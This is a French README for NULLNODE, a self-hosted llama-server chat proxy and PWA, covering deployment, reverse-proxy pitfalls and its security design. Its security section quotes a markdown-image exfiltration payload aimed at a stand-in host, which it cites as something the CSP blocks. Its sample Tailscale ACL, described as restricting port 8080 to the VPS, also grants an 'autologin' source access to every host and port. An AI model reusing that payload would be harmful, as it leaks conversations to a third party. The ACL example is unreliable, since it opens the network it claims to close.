# llm-chat

**NULLNODE** — terminal de chat pour un `llama-server` auto-hébergé.
PWA installable, thème phosphore, exposable sur le LAN ou derrière un reverse proxy.
React + Vite en front, un proxy Node sans dépendance en back.

Pensée autour de la contrainte réelle du poste : **~5,8 tok/s en génération**.
Tout ce qui compte (streaming, Stop, compteurs live, garde-fous de contexte)
existe parce qu'une réponse de 1000 tokens prend trois minutes.

```
server.js                       proxy + statique + auth, 0 dépendance
lib/auth.js                     mot de passe, sessions signées, anti brute-force
lib/security.js                 CSP et en-têtes de sécurité
lib/login.html                  écran de connexion (HTML + CSS purs, sans JS)
web/                            front Vite + React + Tailwind -> web/dist
web/public/                     manifest PWA, service worker, icônes
deploy/                         scripts d'installation et de mise à jour,
                                unité systemd, launchd, nginx, Caddy
```

## Architecture déployée

```
navigateur ──TLS──> VPS hermes-vps ──Tailscale/WireGuard──> MacBook
                    nginx :443                              llama-server :8080
                    server.js :3000 (loopback)              modèle qwen38-abl
                    100.121.56.75                           100.96.144.95
```

Le proxy Node tourne **sur le VPS**, pas sur le Mac : `LLM_UPSTREAM` pointe
donc sur l'IP Tailscale du Mac, et aucun port du MacBook n'est exposé
publiquement. Le `.plist` launchd n'est utile que si vous faites tourner
`server.js` directement sur le Mac (déploiement LAN).

## Prérequis

- Node ≥ 20 sur le Mac (`brew install node`)
- `llama-server` joignable depuis la machine qui fait tourner `server.js`
  (`127.0.0.1:8080` en local, `100.96.144.95:8080` depuis le VPS via Tailscale)
- La clé API dans `~/.qwen38-api-key`
- Un mot de passe d'accès dans `~/.llm-chat-password` (le serveur refuse de
  démarrer sans, sauf `AUTH_DISABLED=1`)

## Installation

```bash
git clone <ce-repo> ~/llm-chat
cd ~/llm-chat
npm run setup                              # deps du front + build web/dist
printf 'mon-mot-de-passe' > ~/.llm-chat-password && chmod 600 ~/.llm-chat-password
npm start                                  # http://<ip-du-mac>:3000
```

Pour ne pas laisser le mot de passe en clair sur le disque :

```bash
npm run hash-password 'mon-mot-de-passe'   # -> scrypt$...$...
export APP_PASSWORD_HASH='scrypt$...$...'
```

## Variables d'environnement

| Variable           | Défaut                  | Rôle |
|--------------------|-------------------------|------|
| `LLM_API_KEY`      | —                       | Clé envoyée en `Authorization: Bearer`. Prioritaire. |
| `LLM_API_KEY_FILE` | `~/.qwen38-api-key`     | Fichier lu si `LLM_API_KEY` est absente. |
| `LLM_UPSTREAM`     | `http://127.0.0.1:8080` | llama-server. Sur le VPS : `http://100.96.144.95:8080`. |
| `PORT`             | `3000`                  | |
| `HOST`             | `0.0.0.0`               | **`127.0.0.1` derrière un reverse proxy** : le port ne doit pas être joignable directement. |
| `WEB_DIR`          | `web/dist`              | Build servi. |
| `APP_PASSWORD`     | —                       | Mot de passe d'accès en clair. |
| `APP_PASSWORD_HASH`| —                       | Empreinte scrypt (`npm run hash-password`). Prioritaire. |
| `APP_PASSWORD_FILE`| `~/.llm-chat-password`  | Fichier lu si les deux précédentes sont absentes. |
| `SESSION_SECRET`   | auto                    | Clé HMAC des sessions. Générée et persistée dans `~/.llm-chat-session-secret` si absente. |
| `TRUST_PROXY`      | `0`                     | **Mettre à `1` derrière un reverse proxy** : lit `X-Forwarded-Proto` et `X-Forwarded-For`. |
| `AUTH_DISABLED`    | `0`                     | `1` désactive l'authentification. À réserver à un binding `127.0.0.1`. |
| `MAX_BODY_BYTES`   | `1000000`               | Taille max d'une requête `/api`. |

La clé n'atteint jamais le navigateur : le front appelle `/api/*`, le proxy
réinjecte l'en-tête côté Node.

## Développement

Deux process :

```bash
npm run dev:server     # node --watch server.js   (:3000, proxy + API)
npm run dev:web        # vite                     (:5173, HMR)
```

Vite renvoie `/api` vers `:3000`, donc la clé reste côté Node même en dev.
Ouvrir `http://localhost:5173`.

Build de prod : `npm run build` (sortie `web/dist`), puis `npm start`.

## Déploiement sur le VPS

Première installation :

```bash
git clone https://github.com/qentinalouviers-sys/X /tmp/nullnode
sudo bash /tmp/nullnode/deploy/bootstrap.sh
```

Le script crée l'utilisateur de service, les répertoires, demande les deux
secrets (saisis à l'invite, jamais en argument — l'historique du shell les
garderait), clone dans `/opt/llm-chat`, construit le front sous le compte de
service, installe l'unité systemd et lance une vérification. Il est idempotent :
relançable sans casse.

Restent deux choses à faire une seule fois, à la main :

```bash
sudo cp /opt/llm-chat/deploy/nginx.conf.example /etc/nginx/sites-available/x.eviatek.fr
sudo ln -s /etc/nginx/sites-available/x.eviatek.fr /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
sudo ss -lntp | grep 3000      # doit afficher 127.0.0.1:3000, jamais 0.0.0.0
```

Mises à jour :

```bash
sudo bash /opt/llm-chat/deploy/update.sh
```

`update.sh` récupère `main`, reconstruit, redémarre, vérifie — et **revient au
commit précédent** si la vérification échoue. Pour déployer une autre branche
ponctuellement : `sudo BRANCH=ma-branche bash /opt/llm-chat/deploy/update.sh`.

Vérification seule, à tout moment :

```bash
sudo bash /opt/llm-chat/deploy/healthcheck.sh
```

Elle contrôle que l'app et l'API sont bien protégées, que l'écran de connexion
répond, que la CSP est présente, et rapporte l'état du lien vers `llama-server`
(prêt / en chargement / injoignable) sans bloquer dessus — après un reboot du
Mac, 503 pendant deux minutes est normal.

### Pièges de reverse proxy

Deux réglages nginx cassent l'app s'ils sont oubliés, tous deux dans
`deploy/nginx.conf.example` :

- `proxy_buffering off` — sinon nginx accumule le flux SSE et l'interface reste
  figée jusqu'à la fin de la génération.
- `proxy_read_timeout 900s` — le défaut de 60 s coupe la connexion pendant le
  traitement d'un prompt long, *avant* le premier token. Le symptôme trompe :
  ça ne casse que sur les longues conversations.

## Démarrage automatique sur le Mac (LaunchAgent, déploiement LAN)

```bash
sed -i '' "s|/Users/yohan|$HOME|g" deploy/com.yohan.llmchat.plist
cp deploy/com.yohan.llmchat.plist ~/Library/LaunchAgents/
launchctl load  ~/Library/LaunchAgents/com.yohan.llmchat.plist
launchctl list | grep llmchat
tail -f ~/Library/Logs/llm-chat.log
```

Vérifier le chemin de `node` dans le plist (`which node` — souvent
`/opt/homebrew/bin/node` sur Apple Silicon) : launchd n'hérite pas du `PATH`
du shell.

Décharger : `launchctl unload ~/Library/LaunchAgents/com.yohan.llmchat.plist`.



## Interface

Thème terminal : fond quasi noir, phosphore vert, monospace de bout en bout,
scanlines CRT et vignette. Aucune police n'est téléchargée — la pile mono
système est utilisée telle quelle, donc rien à charger et rien à fuiter.

Les effets (scanlines, halo, clignotements) se coupent depuis la barre
latérale — bouton `FX [ON/OFF]`, mémorisé par appareil. Ils sont désactivés
d'office pour qui a réglé `prefers-reduced-motion`. Sur mobile le halo et les
scanlines fatiguent vite : le bouton n'est pas décoratif.

Repères de lecture : `OPERATOR` pour vos messages, `NODE` pour le modèle,
`◈ STREAM` pendant la génération, `TRONQUÉ · MAX_TOKENS` sur une réponse
coupée, `SIGKILL OPÉRATEUR` sur un arrêt manuel.

## PWA

L'app s'installe et se lance en plein écran, sans barre d'URL.

- **Android / Chrome** : bouton `⤋ INSTALLER L'APP` dans la barre latérale
  (il n'apparaît que quand le navigateur propose l'installation).
- **iOS / Safari** : Safari n'expose pas d'API d'installation — passer par
  Partager → « Sur l'écran d'accueil ». L'icône et le nom viennent du manifest.

Le service worker ne met en cache **que la coquille statique** : `/`, les
bundles hachés de `/assets/`, les icônes et le manifest. `/api/` et `/auth/`
en sont exclus par une règle explicite — mettre une réponse du modèle ou une
redirection de login dans le cache du navigateur serait à la fois inutile et
une fuite. Vérifié : après usage, le cache ne contient que trois entrées et
aucune ne commence par `/api`.

Hors ligne, la coquille se charge et les conversations restent lisibles depuis
le `localStorage` ; l'état bascule sur `LINK::DOWN` et l'envoi est bloqué.

Les navigations passent toujours par le réseau en premier, sinon une session
expirée servirait la coquille en cache au lieu de la redirection vers l'écran
de connexion.

## Sécurité

Le service est conçu pour être joignable depuis Internet derrière un reverse
proxy TLS. Ce qui est en place :

- **Authentification par mot de passe** sur *toutes* les routes, y compris les
  fichiers statiques : sans session, on ne peut même pas télécharger le bundle.
  Seuls le manifest et les icônes restent publics, pour que l'écran de
  connexion s'affiche et reste installable.
  Session = cookie signé HMAC-SHA256, `HttpOnly`, `SameSite=Strict`, `Secure`
  dès que la requête d'origine est en HTTPS, valable 30 jours.
- **Anti brute-force** : 5 essais ratés puis blocage exponentiel par IP
  (1 min, 2, 4… plafonné à 1 h). Nécessite `TRUST_PROXY=1` derrière un proxy,
  sinon toutes les tentatives sont comptées sur l'IP du proxy et vous vous
  bloquez vous-même.
- **CSP stricte** : `default-src 'self'`, `connect-src 'self'`,
  `img-src 'self' data:`, `worker-src 'self'`, `frame-ancestors 'none'`. C'est cette directive qui
  garantit techniquement que le contenu de vos conversations ne peut pas
  quitter le site : une réponse du modèle contenant
  `![](https://ailleurs/?fuite=...)` est bloquée par le navigateur. Vérifié :
  image, `fetch`, `<script>` et WebSocket vers un domaine tiers sont tous refusés.
- **HSTS**, `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`,
  `X-Robots-Tag: noindex` et `robots.txt` interdisant l'indexation.
- **Une seule génération à la fois côté serveur** (429 sinon) et corps de
  requête plafonné : un inconnu ne peut pas saturer le Mac.
- La clé de `llama-server` et le cookie de session ne circulent jamais
  ensemble : le cookie est retiré des requêtes proxifiées, la clé n'est
  ajoutée que côté Node.

### Ce qui n'est *pas* couvert

- **Le TLS est terminé par nginx sur le VPS**, pas par ce service. Vos prompts
  existent en clair dans la mémoire du VPS le temps du transit. Aucun tiers
  type Cloudflare n'est dans la boucle, mais l'hébergeur du VPS a un accès
  hyperviseur à cette machine. C'est le seul tiers du montage.
- **Le saut VPS → Mac est chiffré par Tailscale (WireGuard)**, sans port public
  sur le MacBook. En revanche `llama-server` écoute sur `0.0.0.0:8080` : il est
  donc aussi joignable depuis votre réseau Wi-Fi domestique, protégé
  uniquement par la clé Bearer. Restreignez-le par une ACL Tailscale ou en le
  liant à l'IP `100.96.144.95`. Exemple d'ACL Tailscale, qui limite l'accès au
  port 8080 au seul VPS :

  ```json
  {
    "acls": [
      { "action": "accept", "src": ["hermes-vps"], "dst": ["macbook:8080"] },
      { "action": "accept", "src": ["autologin"],  "dst": ["*:*"] }
    ]
  }
  ```
- **Les conversations sont stockées en clair dans le `localStorage`** du
  navigateur. Elles ne transitent nulle part, mais quiconque a accès au
  navigateur déverrouillé les lit.
- **`llama-server` journalise les prompts** selon sa configuration. Le
  fichier de log sur le Mac est un stockage en clair de tout l'historique.
- **Rien ne protège contre une faille de `llama-server` lui-même.** Vérifiez
  que le port 8080 n'est pas exposé publiquement en plus du 3000.

### Vérifications à faire depuis l'extérieur

Depuis une machine extérieure au tailnet (4G du téléphone, par exemple) :

```bash
# 1. TLS valide et redirection depuis http://
curl -sSI https://x.eviatek.fr/ | head -1
curl -sS -o /dev/null -w '%{http_code} -> %{redirect_url}\n' http://x.eviatek.fr/

# 2. Rien n'est accessible sans session (302 puis 401)
curl -s -o /dev/null -w '%{http_code}\n' https://x.eviatek.fr/
curl -s -o /dev/null -w '%{http_code}\n' https://x.eviatek.fr/api/health

# 3. LE PLUS IMPORTANT: le port 3000 du VPS ne doit PAS répondre.
#    S'il répond, on atteint l'app en clair, sans TLS, et TRUST_PROXY=1
#    permet alors d'usurper X-Forwarded-For pour contourner l'anti brute-force.
curl -sS --max-time 5 http://100.121.56.75:3000/     # remplacer par l'IP PUBLIQUE du VPS
sudo ss -lntp | grep 3000                            # sur le VPS: doit afficher 127.0.0.1:3000

# 4. Le Mac ne doit rien exposer publiquement
sudo lsof -nP -iTCP:8080 -sTCP:LISTEN                # sur le Mac
#    et depuis l'extérieur du tailnet, aucune de ces adresses ne doit répondre.

# 5. Note TLS
#    https://www.ssllabs.com/ssltest/analyze.html?d=x.eviatek.fr
```

## Endpoints

| Front            | Upstream                | |
|------------------|-------------------------|---|
| `/auth/login`    | —                       | formulaire HTML, POST `password` |
| `/auth/logout`   | —                       | efface le cookie |
| `/api/health`    | `/health`               | 200 prêt · 503 modèle en chargement · 502 llama-server absent |
| `/api/v1/models` | `/v1/models`            | nom du modèle au démarrage |
| `/api/v1/chat/completions` | idem          | SSE, `stream: true` |

## Choix non évidents

**Aucun timeout nulle part.** `server.requestTimeout`, `headersTimeout`,
`res.setTimeout` et le timeout upstream sont tous à 0, et le client ne pose
aucun `AbortSignal.timeout`. Le défaut Node (5 min sur `requestTimeout`)
couperait une génération longue en plein milieu.

**`accept-encoding: identity` forcé vers l'upstream.** Un flux gzippé est
bufferisé par le compresseur, ce qui annule le streaming token par token.

**L'abort client détruit la requête upstream.** Sans ça, le bouton Stop
libère l'UI mais laisse llama-server générer dans le vide — sur un serveur
`--parallel 1`, le message suivant attendrait la fin de la réponse annulée.

**Le texte en cours de stream ne vit pas dans le store persisté.** Recopier
tout l'arbre de conversations et le resérialiser en localStorage à chaque
token coûterait plus cher que la génération elle-même. Le texte est commité
dans la conversation à la fin du flux (ou à l'abort, ou à l'erreur).

**Le compteur de contexte est une estimation.** Le seul tokenizer exact est
dans llama-server, et `/tokenize` ferait la queue derrière la génération sur
un serveur `--parallel 1`. On part d'un ratio caractères/token, recalibré à
chaque tour sur les `prompt_tokens` réellement renvoyés par le serveur.

**« Continuer » n'est pas une vraie continuation.** L'endpoint chat referme
toujours le tour assistant. On envoie donc une instruction utilisateur
jetable (non persistée) et on concatène le texte reçu au message existant.
Marche bien en pratique, mais le modèle peut répéter une phrase à la jointure.

## Cas limites gérés

- **Modèle en chargement** (~2 min après reboot) : `/api/health` renvoie 503,
  bandeau explicite, poll à 3 s au lieu de 15 s, et un envoi parti trop tôt
  attend la disponibilité (jusqu'à 5 min) puis repart tout seul.
- **`finish_reason: "length"`** : badge « réponse tronquée » + bouton Continuer.
- **Coupure réseau en plein stream** : le partiel est conservé et marqué
  interrompu, avec Continuer / Régénérer.
- **Dépassement de contexte** : la jauge passe en orange à 80 %, et si
  `prompt + max_tokens > 8192` l'envoi demande une confirmation explicite —
  le serveur tronquerait silencieusement.
- **Envoi concurrent** : bloqué pendant une génération (`--parallel 1`).

## Limites connues

- Rafraîchir la page en plein streaming perd la réponse en cours (rien n'est
  persisté avant la fin du flux). La requête upstream, elle, est bien annulée.
- L'estimation de tokens dérive sur du texte très inhabituel (base64, CJK)
  tant que le premier tour n'a pas recalibré le ratio.
- `localStorage` est par appareil : les conversations ouvertes sur l'iPhone ne
  sont pas celles du PC. Il n'y a pas de base de données, c'était le cahier
  des charges.
- Un seul mot de passe partagé, pas de comptes ni de 2FA. Suffisant pour un
  outil personnel, insuffisant si vous ouvrez l'accès à d'autres personnes.
- Les sessions ne sont pas révocables individuellement : pour déconnecter tous
  les appareils, supprimez `~/.llm-chat-session-secret` et redémarrez.
- Le blocage anti brute-force est en mémoire : un redémarrage le remet à zéro.
- `lib/login.html` est lu une seule fois au démarrage : redémarrez le service
  après l'avoir modifié.
- Le bundle pèse ~160 kB gzip, dominé par `highlight.js` et `react-markdown`.
  Invisible sur le LAN, moins sur un premier chargement en 4G — le service
  worker règle le problème dès la deuxième visite.
